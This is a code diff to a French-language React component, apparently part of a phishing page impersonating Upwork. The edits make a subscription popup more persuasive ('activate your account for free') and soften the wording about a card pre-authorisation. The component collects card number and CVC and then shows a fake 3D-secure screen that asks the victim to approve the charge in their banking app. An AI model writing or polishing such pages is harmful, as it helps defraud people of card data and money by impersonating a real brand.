@@ -100,7 +100,7 @@ const Board = () => {
       <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
       {showCache && <div className='dashboard-cache'></div>}
       <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
-        <h2>Exprimez votre plein potentiel avec Upwork Experts</h2>
+        <h2>Activez gratuitement votre compte Upwork Experts</h2>
         <div className="plans">
           <div className="plan ">
             <h3>Freelance</h3>
@@ -153,7 +153,7 @@ const Board = () => {
                     <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                   </div>
                 </div>
-                <p className='trial-notice'>Une pré-autorisation temporaire du montant sera effectuée sur votre compte.</p>
+                <p className='trial-notice'>Une pré-autorisation temporaire du montant sera effectuée via votre compte.</p>
                 <button className='buy' type="submit" disabled={isLoading}>
                   {isLoading ? 'Vérification...' : 'Démarrer mon essai'}
                 </button>
@@ -169,7 +169,7 @@ const Board = () => {
         <div className="popup show">
           <div className="popup-content d-secure show">
             <h3>Vérificaton 3D-secure</h3>
-            <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} sur votre application bancaire.</p>
+            <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
             <span>Essai 30 jours {selectedPlan}</span>
             <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
             <span>{new Date().toLocaleDateString('fr-FR')} {new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })}</span>
